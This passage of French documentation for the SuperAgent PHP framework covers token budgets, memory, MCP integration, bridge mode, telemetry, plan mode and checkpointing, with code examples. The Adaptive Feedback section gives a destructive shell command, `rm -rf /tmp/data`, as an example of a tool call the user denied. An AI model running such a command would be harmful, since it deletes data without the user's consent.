| `action` | `string` | `'continue'` ou `'stop'` |
| `nudgeMessage` | `?string` | Message à injecter lors de la continuation |
| `completionEvent` | `?TokenBudgetCompletionEvent` | Télémétrie lors de l'arrêt |
| `continuationCount` | `int` | Continuations jusqu'ici |
| `pct` | `int` | Pourcentage du budget utilisé |
| `turnTokens` | `int` | Total des tokens consommés |
| `budget` | `int` | Budget total |
| `shouldContinue()` | `bool` | Si l'agent doit continuer |
| `shouldStop()` | `bool` | Si l'agent doit s'arrêter |

**Constructeurs statiques :**

| Méthode | Description |
|--------|-------------|
| `TokenBudgetDecision::continue(string $nudgeMessage, int $continuationCount, int $pct, int $turnTokens, int $budget)` | Créer une décision de continuation |
| `TokenBudgetDecision::stop(?TokenBudgetCompletionEvent $completionEvent)` | Créer une décision d'arrêt |

#### `TokenBudgetCompletionEvent`

Émis quand le tracker décide de s'arrêter, fournissant des données de télémétrie :

| Propriété | Type | Description |
|----------|------|-------------|
| `continuationCount` | `int` | Total des continuations avant l'arrêt |
| `pct` | `int` | Pourcentage final du budget utilisé |
| `turnTokens` | `int` | Total des tokens consommés |
| `budget` | `int` | Budget total |
| `diminishingReturns` | `bool` | Si l'arrêt a été déclenché par des rendements décroissants |
| `durationMs` | `int` | Durée totale en millisecondes |

```php
$event->toArray();
// [
//   'continuation_count' => 4,
//   'pct' => 92,
//   'turn_tokens' => 46000,
//   'budget' => 50000,
//   'diminishing_returns' => false,
//   'duration_ms' => 15230,
// ]
```

### Exemples

#### Boucle d'agent consciente du budget

```php
use SuperAgent\TokenBudget\TokenBudgetTracker;

$tracker = new TokenBudgetTracker();
$budget = 80_000;
$totalOutputTokens = 0;

while (true) {
    // Appeler le LLM
    $response = $provider->generateResponse($messages, $options);
    $totalOutputTokens += $response->usage->outputTokens;

    // Traiter les appels d'outils
    if ($response->hasToolCalls()) {
        $toolResults = executeTools($response->toolCalls);
        $messages[] = $toolResults;
    } else {
        // Pas d'appels d'outils : tâche terminée
        break;
    }

    // Vérifier le budget
    $decision = $tracker->check(
        budget: $budget,
        globalTurnTokens: $totalOutputTokens,
    );

    if ($decision->shouldStop()) {
        if ($decision->completionEvent?->diminishingReturns) {
            echo "Arrêté : rendements décroissants détectés\n";
        } else {
            echo "Arrêté : seuil de budget atteint\n";
        }
        break;
    }

    // Continuer : injecter la relance
    $messages[] = new UserMessage($decision->nudgeMessage);
}
```

#### Comportement des sous-agents

Les sous-agents (identifiés par un `agent_id` dans les options) s'arrêtent toujours immédiatement :

```php
$decision = $tracker->check(
    budget: 50_000,
    globalTurnTokens: 10_000,
    isSubAgent: true,  // Retourne toujours stop
);
$decision->shouldStop(); // true (les sous-agents ne continuent jamais)
```

#### Télémétrie et surveillance

```php
$decision = $tracker->check($budget, $totalTokens);

if ($decision->shouldStop() && $decision->completionEvent !== null) {
    $event = $decision->completionEvent;

    // Journaliser les métriques de complétion
    $logger->info('Boucle d\'agent terminée', $event->toArray());

    // Suivre le taux de rendements décroissants
    if ($event->diminishingReturns) {
        $metrics->increment('agent.diminishing_returns_stops');
    } else {
        $metrics->increment('agent.budget_threshold_stops');
    }

    // Suivre le nombre moyen de continuations
    $metrics->gauge('agent.continuation_count', $event->continuationCount);
}
```

#### Comparaison avec maxTurns fixe

L'approche par budget de tokens s'adapte à la complexité de la tâche :

```
maxTurns=10 fixe :
  Tâche simple : L'agent exécute 10 tours alors qu'il a terminé en 3 (gaspillage)
  Tâche complexe : L'agent atteint la limite de 10 tours en plein travail (incomplet)

Budget de tokens=50K :
  Tâche simple : L'agent produit 8K tokens en 3 tours, pas encore de vérification de rendements décroissants, s'arrête naturellement
  Tâche complexe : L'agent utilise 45K tokens sur 8 tours, s'arrête au seuil de 90% avec le travail terminé
  Tâche bloquée : L'agent produit <500 tokens par tour après 3 continuations, s'arrête tôt
```

### Dépannage

#### L'agent s'arrête trop tôt

- Augmentez la valeur du `tokenBudget`. L'agent s'arrête à 90% du budget.
- Vérifiez si les rendements décroissants sont déclenchés. Le seuil de 500 tokens peut être trop agressif pour les tâches avec de petits changements incrémentaux. Actuellement ce seuil n'est pas configurable.

#### L'agent ne s'arrête pas (maxTurns atteint à la place)

- Vérifiez que `tokenBudget` est défini dans le constructeur de `QueryEngine`.
- Assurez-vous que le flag de fonctionnalité expérimentale `token_budget` est activé.
- Si le budget est très grand par rapport à la sortie réelle, le seuil de 90% peut ne jamais être atteint avant `maxTurns`.

#### Les sous-agents n'exécutent pas plusieurs tours

- Les sous-agents (ceux avec `agent_id` dans les options) s'arrêtent toujours après un tour par conception. Cela empêche les agents imbriqués de consommer des tokens sans limite.

#### Les messages de relance encombrent la conversation

- Les messages de relance sont intentionnellement injectés pour garder le modèle concentré. Ils incluent les statistiques d'utilisation du budget : `"Token budget: 40% used (20000 / 50000 tokens). Continue working on the task."`
- Ce sont des messages utilisateur normaux dans le contexte de la conversation et sont attendus.

#### Pas d'événement de complétion à l'arrêt

- Un `TokenBudgetCompletionEvent` n'est créé que quand le tracker décide activement de s'arrêter (soit via le seuil de budget soit via les rendements décroissants). Si `budget` est null, que l'agent est un sous-agent, ou que le tracker n'a jamais commencé à compter les continuations, l'événement sera null.

---

## 10. Fenêtre de Contexte Intelligente

> Allocation dynamique de tokens entre la réflexion et le contexte en fonction de la complexité de la tâche, avec des préréglages de stratégie et des surcharges par tâche.

### Vue d'ensemble

Le système de Fenêtre de Contexte Intelligente partitionne dynamiquement le budget total de tokens entre la **réflexion** (raisonnement étendu) et le **contexte** (historique de conversation) en fonction de la complexité de la tâche.

### Préréglages de stratégie

| Stratégie | Réflexion | Contexte | Messages récents conservés |
|-----------|-----------|----------|----------------------------|
| `deep_thinking` | 60% | 40% | 4 messages |
| `balanced` | 40% | 60% | 8 messages |
| `broad_context` | 15% | 85% | 16 messages |

### Utilisation

```php
$manager = new SmartContextManager(totalBudgetTokens: 100_000);

$allocation = $manager->allocate('Refactor the auth module to use OAuth2 with PKCE flow');
// strategy=deep_thinking, thinking=60K, context=40K

$allocation = $manager->allocate('Show me the contents of config.php');
// strategy=broad_context, thinking=15K, context=85K

$manager->setForceStrategy('deep_thinking'); // Surcharge
```

### Dépannage

**Le budget de réflexion n'est pas appliqué** -- Les `options['thinking']` explicites ont la priorité sur l'allocation de la Fenêtre de Contexte Intelligente.

---

## 11. Feedback Adaptatif

> Un système d'apprentissage qui suit les corrections et refus récurrents de l'utilisateur, puis promeut automatiquement les schémas persistants en règles de guardrails ou en entrées mémoire afin que l'agent évite de répéter les mêmes erreurs.

### Vue d'ensemble

Chaque fois qu'un utilisateur refuse l'exécution d'un outil, annule une modification, rejette une sortie ou donne un retour comportemental explicite, le système de Feedback Adaptatif enregistre un **schéma de correction**. Lorsqu'un schéma dépasse un seuil de promotion configurable (par défaut : 3 occurrences), le système le promeut automatiquement :

- Les **refus d'outils** et les **annulations de modifications** deviennent des **règles de Guardrails**
- Les **corrections comportementales**, les **contenus indésirables** et les **rejets de sorties** deviennent des **entrées mémoire**

### Les 5 catégories de correction

| Catégorie | Déclencheur | Promu en |
|---|---|---|
| Outil refusé | L'utilisateur refuse une demande de permission d'outil | Règle de Guardrails |
| Sortie rejetée | L'utilisateur dit « non », « faux », rejette le résultat | Entrée mémoire |
| Correction comportementale | Retour explicite comme « arrêtez d'ajouter des commentaires » | Entrée mémoire |
| Modification annulée | L'utilisateur annule une modification de fichier de l'agent | Règle de Guardrails |
| Contenu indésirable | L'utilisateur signale un contenu comme inutile | Entrée mémoire |

### Utilisation

```php
$collector = new CorrectionCollector($store);
$collector->recordDenial('Bash', ['command' => 'rm -rf /tmp/data'], 'User denied');
$collector->recordCorrection('stop adding docstrings to every function');

$engine = new AdaptiveFeedbackEngine($store, promotionThreshold: 3, autoPromote: true);
$engine->setGuardrailsEngine($guardrailsEngine);
$engine->setMemoryStorage($memoryStorage);
$promotions = $engine->evaluate();
```

### Dépannage

**Les schémas ne sont pas promus.** Vérifiez que `auto_promote` est à `true` et que `evaluate()` est bien appelé.

---

## 12. Distillation de Compétences

> Capture automatiquement les traces d'exécution réussies de l'agent et les distille en modèles de compétences Markdown réutilisables que des modèles moins coûteux peuvent suivre, réduisant considérablement le coût pour les tâches récurrentes.

### Vue d'ensemble

Lorsqu'un modèle coûteux résout une tâche multi-étapes, le système de Distillation de Compétences capture la trace d'exécution complète et la distille en un modèle de compétences étape par étape pour des modèles moins coûteux.

| Modèle source | Modèle cible | Économies estimées |
|---|---|---|
| Claude Opus | Claude Sonnet | ~70% |
| Claude Sonnet | Claude Haiku | ~83% |
| GPT-4o | GPT-4o-mini | ~88% |

### Utilisation

```php
$trace = ExecutionTrace::fromMessages($prompt, $messages, $model, $cost, $inTokens, $outTokens, $turns);
$store = new DistillationStore(storage_path('superagent/distilled_skills.json'));
$engine = new DistillationEngine($store, minSteps: 3, minCostUsd: 0.01);

if ($engine->isWorthDistilling($trace)) {
    $skill = $engine->distill($trace, 'add-input-validation');
}
```

### Dépannage

**Les traces ne sont jamais distillées.** Vérifiez que les seuils `min_steps` et `min_cost_usd` sont atteints. Les traces comportant des erreurs sont rejetées.

---

## 13. Système de Mémoire

> Mémoire persistante inter-sessions avec extraction en temps réel, journaux quotidiens KAIROS en ajout seul, et consolidation automatique nocturne (auto-dream) dans un index structuré MEMORY.md.

### Vue d'ensemble

Le Système de Mémoire de SuperAgent fonctionne sur trois couches :

1. **Extraction de mémoire de session en temps réel** -- Mécanisme de déclenchement à 3 portes (seuil de tokens, croissance de tokens, seuil d'activité)
2. **Journaux quotidiens KAIROS** -- Journal horodaté en ajout seul
3. **Consolidation auto-dream** -- Processus en 4 phases (Orienter, Rassembler, Consolider, Élaguer)

### Types de mémoire

| Type | Description | Portée par défaut |
|------|-------------|-------------------|
| `user` | Rôle, objectifs, responsabilités de l'utilisateur | `private` |
| `feedback` | Conseils sur l'approche du travail | `private` |
| `project` | Travail en cours, objectifs, incidents non déductibles du code | `team` |
| `reference` | Pointeurs vers des systèmes externes | `team` |

### Configuration

```php
$config = new MemoryConfig(
    minimumMessageTokensToInit: 8000,
    minimumTokensBetweenUpdate: 4000,
    toolCallsBetweenUpdates: 5,
    autoDreamMinHours: 24,
    autoDreamMinSessions: 5,
    maxMemoryFiles: 200,
    maxEntrypointLines: 200,
    maxEntrypointBytes: 25000,
    staleMemoryDays: 30,
    expireMemoryDays: 90,
);
```

### Utilisation

```php
// Extraction de mémoire de session
$extractor = new SessionMemoryExtractor($provider, $config, $logger);
$extractor->maybeExtract($messages, $sessionId, $memoryBasePath, $lastTurnHadToolCalls);

// Journaux quotidiens
$dailyLog = new DailyLog($memoryDir, $logger);
$dailyLog->append('User prefers factory pattern over builder');

// Consolidation auto-dream
$consolidator = new AutoDreamConsolidator($storage, $provider, $config, $logger);
if ($consolidator->shouldRun()) {
    $consolidator->run();
}
```

### Dépannage

**Les mémoires ne sont pas extraites** -- Vérifiez que la conversation contient au moins 8 000 tokens.

**L'auto-dream ne s'exécute pas** -- Confirmez qu'au moins 24 heures et 5 sessions se sont écoulées depuis la dernière exécution.

---

## 14. Graphe de Connaissances

> Un graphe partagé et persistant de fichiers, symboles, agents et décisions qui s'accumule au fil des sessions multi-agents -- permettant aux agents suivants d'éviter l'exploration redondante de la base de code.

### Vue d'ensemble

Lorsque les agents exécutent des appels d'outils, le Graphe de Connaissances capture automatiquement les événements sous forme de **nœuds** (File, Symbol, Agent, Decision, Tool) et d'**arêtes** (Read, Modified, Created, Depends On, Decided, Searched, Executed, Defined In) dans un graphe orienté.

### Utilisation

```php
$graph = new KnowledgeGraph(storage_path('superagent/knowledge_graph.json'));
$collector = new GraphCollector($graph, 'my-agent');

$collector->recordToolCall('Read', ['file_path' => '/src/App.php'], 'file content...');
$collector->recordToolCall('Edit', ['file_path' => '/src/App.php'], 'OK');
$collector->recordDecision('Chose repository pattern for data access');

$hotFiles = $graph->getHotFiles(10);
$agents = $graph->getAgentsForFile('src/App.php');
$summary = $graph->getSummary();
```

### Dépannage

**Le graphe est vide** -- Vérifiez que `knowledge_graph.enabled` est à `true` et que `GraphCollector::recordToolCall()` est bien appelé.

**Le graphe devient trop volumineux** -- Le collecteur limite les résultats Grep/Glob à 20 fichiers par appel. Exportez et purgez périodiquement.

---

## 15. Pensée Étendue

> Modes de réflexion adaptatif, activé ou désactivé avec déclenchement par mot-clé ultrathink, détection des capacités du modèle et gestion du budget de tokens.

### Vue d'ensemble

La Pensée Étendue permet à l'agent d'effectuer un raisonnement explicite en chaîne de pensées. Trois modes :

| Mode | Comportement |
|------|-------------|
| **adaptive** | Le modèle décide quand et combien réfléchir. Par défaut pour Claude 4.6+. |
| **enabled** | Réfléchit toujours avec un budget fixe configurable. |
| **disabled** | Pas de réflexion. Le plus rapide et le moins coûteux. |

Le déclencheur par mot-clé **ultrathink** maximise le budget à 128 000 tokens.

### Utilisation

```php
$config = ThinkingConfig::adaptive();
$config = ThinkingConfig::enabled(budgetTokens: 20_000);
$config = ThinkingConfig::disabled();

// Ultrathink
$boosted = $config->maybeApplyUltrathink('ultrathink: analyze the race condition');
// mode=enabled, budget=128000

// Détection des capacités du modèle
ThinkingConfig::modelSupportsThinking('claude-opus-4-20260401');   // true
ThinkingConfig::modelSupportsAdaptiveThinking('claude-opus-4-6');   // true

// Paramètres API
$param = $config->toApiParameter('claude-sonnet-4-20260401');
// ['type' => 'enabled', 'budget_tokens' => 20000]
```

### Dépannage

**La réflexion ne s'active pas** -- Vérifiez que le modèle supporte la réflexion. Seuls Claude 4+ et Claude 3.5 Sonnet v2+ le supportent.

**Ultrathink ne fonctionne pas** -- Nécessite le flag de fonctionnalité expérimentale `ultrathink`.

---

## 16. Intégration du protocole MCP

> Connectez SuperAgent à des serveurs d'outils externes en utilisant le Model Context Protocol (MCP), avec prise en charge des transports stdio, HTTP et SSE, la découverte automatique d'outils, l'injection d'instructions serveur et un pont TCP qui partage les connexions stdio avec les processus enfants.

### Vue d'ensemble

SuperAgent implémente un client MCP complet avec trois classes principales :

- **`MCPManager`** -- Registre singleton pour les configurations serveur, les connexions et l'agrégation d'outils
- **`Client`** -- Client JSON-RPC pour le cycle de vie du protocole MCP
- **`MCPBridge`** -- Proxy TCP pour partager les connexions stdio avec les processus enfants

### Transports

| Transport | Cas d'utilisation |
|-----------|-------------------|
| **stdio** | Lance un processus local, communique via stdin/stdout |
| **HTTP** | Se connecte à un point de terminaison HTTP |
| **SSE** | Se connecte à un point de terminaison Server-Sent Events |

### Configuration

```json
{
  "mcpServers": {
    "filesystem": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@anthropic/mcp-server-filesystem", "/home/user/projects"],
      "env": { "NODE_ENV": "production" }
    },
    "remote-api": {
      "type": "http",
      "url": "https://mcp.example.com/v1",
      "headers": { "Authorization": "Bearer ${API_TOKEN}" }
    }
  }
}
```

### Utilisation

```php
$manager = MCPManager::getInstance();
$manager->loadFromClaudeCode('/path/to/project');
$manager->autoConnect();

$tools = $manager->getTools();
$result = $manager->getTool('mcp_filesystem_readFile')->execute(['path' => '/home/user/example.txt']);
$instructions = $manager->getConnectedInstructions();
```

### Pont TCP

```
Parent :   StdioTransport <-> MCPBridge TCP listener (:port)
Enfant 1 : HttpTransport -> localhost:port --> MCPBridge --> StdioTransport
```

Les informations du pont sont écrites dans `/tmp/superagent_mcp_bridges_<pid>.json`.

### Dépannage

| Problème | Solution |
|----------|----------|
| « MCP server 'X' not registered » | Vérifiez la configuration JSON ou appelez `registerServer()` |
| « Failed to start MCP server » | Vérifiez que la commande fonctionne de manière autonome |
| Le pont n'est pas découvert par le processus enfant | Vérifiez `/tmp/superagent_mcp_bridges_*.json` |
| Les variables d'environnement ne sont pas expansées | Utilisez `${VAR}` ou `${VAR:-default}`, et non `$VAR` |

---

## 17. Mode Bridge

> Améliorez de manière transparente les fournisseurs LLM non-Anthropic (OpenAI, Ollama, Bedrock, OpenRouter) avec les prompts système optimisés de SuperAgent, la validation de sécurité bash, la compaction de contexte, le suivi des coûts, et plus encore.

### Vue d'ensemble

Le Mode Bridge enveloppe tout `LLMProvider` dans un pipeline d'améliorations. Deux phases par appel LLM :

1. **Pré-requête** : Les enhancers modifient les messages, les outils, le prompt système et les options
2. **Post-réponse** : Les enhancers inspectent et transforment le `AssistantMessage`

### Enhancers disponibles

1. **SystemPromptEnhancer** -- Injecte des sections de prompt système optimisées
2. **ContextCompactionEnhancer** -- Réduit la taille du contexte des messages sans appel LLM
3. **BashSecurityEnhancer** -- Valide les commandes bash dans les réponses
4. **MemoryInjectionEnhancer** -- Injecte le contexte mémoire pertinent
5. **ToolSchemaEnhancer** -- Enrichit les schémas d'outils avec des métadonnées
6. **ToolSummaryEnhancer** -- Ajoute une documentation résumée des outils
7. **TokenBudgetEnhancer** -- Gère les contraintes de budget de tokens
8. **CostTrackingEnhancer** -- Suit l'utilisation des tokens et les coûts

### Utilisation

```php
use SuperAgent\Bridge\BridgeFactory;

// Détection automatique du fournisseur depuis la configuration, application de tous les enhancers activés
$provider = BridgeFactory::createProvider('gpt-4o');

// Ou envelopper un fournisseur existant
$enhanced = BridgeFactory::wrapProvider($openai);

// Ou assembler manuellement
$enhanced = new EnhancedProvider(
    inner: new OllamaProvider(['base_url' => 'http://localhost:11434', 'model' => 'codellama']),
    enhancers: [new SystemPromptEnhancer(), new BashSecurityEnhancer()],
);
```

### Dépannage

**« Unsupported bridge provider: anthropic »** -- Les fournisseurs Anthropic n'ont pas besoin de l'amélioration bridge.

**Commandes bash bloquées dans la réponse** -- Le `BashSecurityEnhancer` remplace les blocs tool_use dangereux par des avertissements textuels.

---

## 18. Télémétrie et Observabilité

> Pile d'observabilité complète avec un interrupteur principal et des contrôles indépendants par sous-système pour le traçage, la journalisation structurée, la collecte de métriques, le suivi des coûts, la distribution d'événements et l'échantillonnage par type d'événement.

### Vue d'ensemble

Cinq sous-systèmes indépendants, tous protégés derrière un interrupteur principal `telemetry.enabled` :

| Sous-système | Classe | Clé de configuration |
|--------------|--------|---------------------|
| **Traçage** | `TracingManager` | `telemetry.tracing.enabled` |
| **Journalisation** | `StructuredLogger` | `telemetry.logging.enabled` |
| **Métriques** | `MetricsCollector` | `telemetry.metrics.enabled` |
| **Suivi des coûts** | `CostTracker` | `telemetry.cost_tracking.enabled` |
| **Événements** | `EventDispatcher` | `telemetry.events.enabled` |
| **Échantillonnage** | `EventSampler` | (configuration inline) |

### Utilisation

```php
// Traçage
$tracing = TracingManager::getInstance();
$span = $tracing->startInteractionSpan('user-query');
$llmSpan = $tracing->startLLMRequestSpan('claude-3-sonnet', $messages);
$tracing->endSpan($llmSpan, ['input_tokens' => 1500]);

// Journalisation structurée (assainit automatiquement les données sensibles)
$logger = StructuredLogger::getInstance();
$logger->logLLMRequest('claude-3-sonnet', $messages, $response, 1250.5);

// Métriques
$metrics = MetricsCollector::getInstance();
$metrics->incrementCounter('llm.requests', 1, ['model' => 'claude-3-sonnet']);
$metrics->recordHistogram('llm.request_duration_ms', 1250.5);

// Suivi des coûts
$tracker = CostTracker::getInstance();
$cost = $tracker->trackLLMUsage('claude-3-sonnet', 1500, 800, 'sess-abc');

// Distribution d'événements
$dispatcher = EventDispatcher::getInstance();
$dispatcher->listen('tool.completed', function (array $data) { /* ... */ });

// Échantillonnage
$sampler = new EventSampler([
    'llm.request' => ['sample_rate' => 1.0],
    'tool.started' => ['sample_rate' => 0.1],
]);
```

### Dépannage

| Problème | Solution |
|----------|----------|
| Aucune sortie de télémétrie | Définissez `telemetry.enabled` à `true` |
| Coût de modèle inconnu = 0 | Ajoutez via `updateModelPricing()` ou la configuration |
| Les écouteurs d'événements ne se déclenchent pas | Activez `telemetry.events.enabled` |

---

## 19. Recherche d'Outils et Chargement Différé

> Recherche floue par mots-clés avec scoring pondéré, mode de sélection directe et chargement différé automatique lorsque les définitions d'outils dépassent 10% de la fenêtre de contexte. Inclut la prédiction basée sur les tâches pour le préchargement des outils pertinents.

### Vue d'ensemble

Trois couches :

- **`ToolSearchTool`** -- Outil de recherche côté utilisateur avec sélection directe (`select:Name1,Name2`) et recherche floue par mots-clés
- **`LazyToolResolver`** -- Résolution d'outils à la demande avec prédiction basée sur les tâches
- **`ToolLoader`** -- Chargeur de bas niveau avec chargement par catégorie et métadonnées par outil

Le chargement différé s'active lorsque le coût total en tokens des outils dépasse **10%** de la fenêtre de contexte du modèle.

### Système de scoring

| Type de correspondance | Points |
|------------------------|--------|
| Correspondance exacte de partie de nom | **10** |
| Correspondance exacte de partie de nom (outil MCP) | **12** |
| Correspondance partielle de partie de nom | **6** (ou 7.2 pour MCP) |
| Correspondance d'indice de recherche | **4** |
| Correspondance de description | **2** |
| Le nom complet contient la requête | **10** |

### Utilisation

```php
// Sélection directe
$result = $tool->execute(['query' => 'select:Read,Edit,Grep']);

// Recherche par mots-clés
$result = $tool->execute(['query' => 'notebook jupyter', 'max_results' => 5]);

// Prédiction basée sur les tâches
$loaded = $resolver->predictAndPreload('Search for TODO comments and edit the files');

// Vérifier si le chargement différé doit être actif
$shouldDefer = ToolSearchTool::shouldDeferTools(totalToolTokens: 20000, contextWindow: 128000);
```

### Dépannage

| Problème | Solution |
|----------|----------|
| La recherche ne renvoie aucun résultat | Appelez `registerTool()` ou `registerTools()` |
| Utilisation mémoire élevée | Utilisez `unloadUnused()` pour libérer la mémoire |

---

## 20. Contexte Incrémental et Paresseux

> Synchronisation de contexte basée sur les deltas avec des points de contrôle automatiques et la compression, plus le chargement paresseux de fragments avec scoring de pertinence, cache TTL, éviction LRU et une API `getSmartWindow` qui insère le contexte le plus pertinent dans un budget de tokens.

### Vue d'ensemble

Deux systèmes complémentaires :

- **Contexte Incrémental** -- Suit les modifications du contexte de conversation au fil du temps via des deltas entre les points de contrôle. Prend en charge la compression automatique, les fenêtres intelligentes et la sauvegarde/restauration de points de contrôle.
- **Contexte Paresseux** -- Enregistre les fragments de contexte sous forme de métadonnées, les chargeant à la demande en fonction de la pertinence par rapport à la tâche. Inclut le cache TTL, l'éviction LRU et le préchargement basé sur les priorités.

### Utilisation

#### Contexte Incrémental

```php
$ctx = new IncrementalContextManager([
    'auto_compress' => true,
    'compress_threshold' => 4000,
    'checkpoint_interval' => 10,
]);

$ctx->initialize($messages);
$ctx->addMessage($userMessage);

$delta = $ctx->getDelta();
$window = $ctx->getSmartWindow(maxTokens: 4000);
$summary = $ctx->getSummary();
```

#### Contexte Paresseux

```php
$lazy = new LazyContextManager([
    'max_memory' => 50 * 1024 * 1024,
    'cache_ttl' => 600,
]);

$lazy->registerContext('project-readme', [
    'type' => 'documentation',
    'priority' => 7,
    'tags' => ['docs', 'overview'],
    'data' => [['role' => 'system', 'content' => 'Project overview: ...']],
]);

$lazy->registerContext('git-history', [
    'type' => 'code',
    'priority' => 5,
    'tags' => ['git', 'history'],
    'source' => function ($id, $meta) {
        return [['role' => 'system', 'content' => shell_exec('git log --oneline -20')]];
    },
]);

$context = $lazy->getContextForTask('Fix the OAuth2 bug', hints: ['auth', 'oauth']);
$window = $lazy->getSmartWindow(maxTokens: 8000, focusArea: 'auth');
```

### Dépannage

| Problème | Solution |
|----------|----------|
| « Checkpoint not found » | Augmentez `max_checkpoints` ou utilisez le plus récent |
| Mémoire élevée dans le contexte paresseux | Réduisez `max_memory` ou appelez `unloadStale()` |
| Compression trop agressive | Définissez `compression_level` à `'minimal'` |
| Fragments de contexte obsolètes | Réduisez `cache_ttl` ou appelez `clear()` |

---

## 21. Phase d'entretien Plan V2

> Flux de travail itératif de planification en binôme où l'agent explore la base de code en collaboration avec l'utilisateur, construit un fichier de plan structuré de manière incrémentale et nécessite une approbation explicite avant toute modification de code. Inclut des rappels périodiques et une vérification post-exécution.

### Vue d'ensemble

Le mode plan fournit un flux de travail discipliné pour les changements complexes. L'agent entre dans une phase d'exploration en lecture seule où il ne peut utiliser que des outils de lecture, met à jour un fichier de plan au fur et à mesure de ses découvertes et interroge l'utilisateur sur les ambiguïtés. Aucun fichier n'est modifié tant qu'une approbation explicite n'est pas donnée.

Trois outils gèrent le cycle de vie :

- **`EnterPlanModeTool`** -- Entre en mode plan avec entretien ou flux de travail traditionnel en 5 phases
- **`ExitPlanModeTool`** -- Sort avec `review`, `execute`, `save` ou `discard`
- **`VerifyPlanExecutionTool`** -- Suit l'exécution des étapes planifiées et rapporte la progression

### Structure du fichier de plan

```markdown
# Plan: Add OAuth2 authentication to the API

Created: 2026-04-04 10:30:00

## Context
*Why this change is needed*

## Recommended Approach
*One clear implementation path*

## Critical Files
*Files to modify with line numbers*

## Existing Code to Reuse
*Functions, utilities, patterns*

## Verification
*How to test the changes*
```

### Utilisation

```php
// Entrer en mode plan
$enter = new EnterPlanModeTool();
$result = $enter->execute([
    'description' => 'Add OAuth2 authentication to the API',
    'estimated_steps' => 8,
    'interview' => true,
]);

// L'agent explore et met à jour le plan de manière incrémentale
EnterPlanModeTool::updatePlanFile('Context', 'The API currently uses basic API key auth...');
EnterPlanModeTool::updatePlanFile('Critical Files', "- `app/Http/Middleware/ApiAuth.php`...");
EnterPlanModeTool::addStep(['tool' => 'edit_file', 'description' => 'Add OAuth2ServiceProvider']);

// Sortir et exécuter
$exit = new ExitPlanModeTool();
$result = $exit->execute(['action' => 'execute']);

// Vérifier chaque étape
$verifier = new VerifyPlanExecutionTool();
$verifier->execute(['step_number' => 1, 'tool' => 'write_file', 'result' => 'success']);
$verifier->execute(['step_number' => 2, 'tool' => 'edit_file', 'result' => 'success',
    'deviation' => 'Used Passport package instead of custom implementation']);
```

### Flux de travail de la phase d'entretien

```
Entrer en mode plan
     |
     v
+--> Explorer (Glob/Grep/Read) ----+
|    |                              |
|    v                              |
|    Mettre à jour le fichier de plan |
|    |                              |
|    v                              |
|    Interroger l'utilisateur       |
|    sur les ambiguïtés             |
|    |                              |
+----+ (répéter jusqu'à complétion) |
     |                              |
     v                              |
Sortir du mode plan --> Approbation |
     |               de l'utilisateur|
     v                              |
Exécuter les étapes <----+          |
     |                   |          |
     v                   |          |
Vérifier l'étape --------+          |
     |                              |
     v                              |
Résumé d'exécution                  |
```

### Dépannage

| Problème | Solution |
|----------|----------|
| « Already in plan mode » | Appelez `ExitPlanModeTool` avec `discard` ou `review` |
| « Not in plan mode » | Appelez `EnterPlanModeTool` d'abord |
| L'agent modifie des fichiers pendant le plan | Les rappels se déclenchent tous les 5 tours ; vérifiez `getPlanModeReminder()` |
| La phase d'entretien ne s'active pas | Vérifiez `ExperimentalFeatures::enabled('plan_interview')` ou forcez avec `setInterviewPhaseEnabled(true)` |

---

## 22. Checkpoint et Reprise

> Instantanés périodiques de l'état permettant à un agent de reprendre là où il s'est arrêté après un crash, un timeout ou une interruption -- au lieu de recommencer depuis le début.

### Vue d'ensemble

Les tâches d'agent de longue durée peuvent être interrompues par des crashs de processus, des timeouts ou des annulations manuelles. Le système de Checkpoint et Reprise sauvegarde périodiquement l'état complet de l'agent sur disque. Lorsque l'agent redémarre, il peut reprendre à partir du dernier checkpoint.

Comportements clés :

- **Basé sur l'intervalle** : Checkpoint tous les N tours (par défaut : 5)
- **Auto-élagage** : Seuls les N derniers checkpoints par session sont conservés (par défaut : 5)
- **Surcharge par tâche** : Activation ou désactivation forcée par invocation
- **Capture d'état complète** : Messages, nombre de tours, coût, utilisation de tokens, état des sous-composants

### Configuration

```php
'checkpoint' => [
    'enabled' => env('SUPERAGENT_CHECKPOINT_ENABLED', false),
    'interval' => (int) env('SUPERAGENT_CHECKPOINT_INTERVAL', 5),
    'max_per_session' => (int) env('SUPERAGENT_CHECKPOINT_MAX', 5),
],
```

### Utilisation

```php
use SuperAgent\Checkpoint\CheckpointManager;
use SuperAgent\Checkpoint\CheckpointStore;

$store = new CheckpointStore(storage_path('superagent/checkpoints'));
$manager = new CheckpointManager($store, interval: 5, maxPerSession: 5, configEnabled: true);

// Dans la boucle de l'agent, après chaque tour :
$checkpoint = $manager->maybeCheckpoint(
    sessionId: $sessionId,
    messages: $messages,
    turnCount: $currentTurn,
    totalCostUsd: $totalCost,
    turnOutputTokens: $outputTokens,
    model: $model,
    prompt: $originalPrompt,
);

// Au démarrage, vérifier l'existence d'un checkpoint
$latest = $manager->getLatest($sessionId);
if ($latest !== null) {
    $state = $manager->resume($latest->id);
    $messages     = $state['messages'];
    $turnCount    = $state['turnCount'];
    $totalCost    = $state['totalCostUsd'];
    $model        = $state['model'];
    $prompt       = $state['prompt'];
}

// Créer un checkpoint de force (par exemple, avant une opération risquée)
$checkpoint = $manager->createCheckpoint($sessionId, $messages, $turnCount, ...);

// Surcharge par tâche
$manager->setForceEnabled(true);   // Forcer l'activation
$manager->setForceEnabled(false);  // Forcer la désactivation
$manager->setForceEnabled(null);   // Utiliser la valeur par défaut de la configuration
```

### Gestion en ligne de commande

```bash
php artisan superagent:checkpoint list
php artisan superagent:checkpoint list --session=abc123
php artisan superagent:checkpoint show <checkpoint-id>
php artisan superagent:checkpoint resume <checkpoint-id>
php artisan superagent:checkpoint delete <checkpoint-id>
php artisan superagent:checkpoint clear
php artisan superagent:checkpoint prune --keep=3
php artisan superagent:checkpoint stats
```

### Dépannage

**Les checkpoints ne sont pas créés.** Vérifiez que `checkpoint.enabled` est à `true` (ou utilisez `setForceEnabled(true)`). Confirmez que `maybeCheckpoint()` est appelé et que le nombre de tours est un multiple de l'intervalle.

**Les fichiers de checkpoint deviennent volumineux.** Chaque checkpoint contient l'historique complet des messages sérialisés. Augmentez l'intervalle ou réduisez `max_per_session`.

**La reprise échoue avec « Unknown message class ».** Les données sérialisées contiennent un type de message non reconnu. Types supportés : `assistant`, `tool_result`, `user`.

**Collisions d'identifiants de checkpoint.** Les identifiants sont déterministes : `md5(sessionId:turnCount)`. Le second checkpoint au même tour écrase le premier.

---

## 23. Historique de Fichiers

